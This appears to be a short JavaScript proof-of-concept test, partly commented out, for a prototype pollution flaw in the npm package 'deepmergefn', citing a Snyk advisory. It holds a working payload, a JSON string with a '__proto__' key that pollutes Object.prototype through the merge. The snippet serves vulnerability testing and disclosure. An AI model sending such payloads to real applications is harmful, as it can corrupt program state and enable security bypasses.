// //https://security.snyk.io/vuln/SNYK-JS-DEEPMERGEFN-1310984
// test("prototype pollution in deepmergefn", () => {
  const deepMerge = require("deepmergefn");

console.log({}.polluted);

  EVIL_DATA = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  deepMerge({}, EVIL_DATA);

console.log({}.polluted);
// });
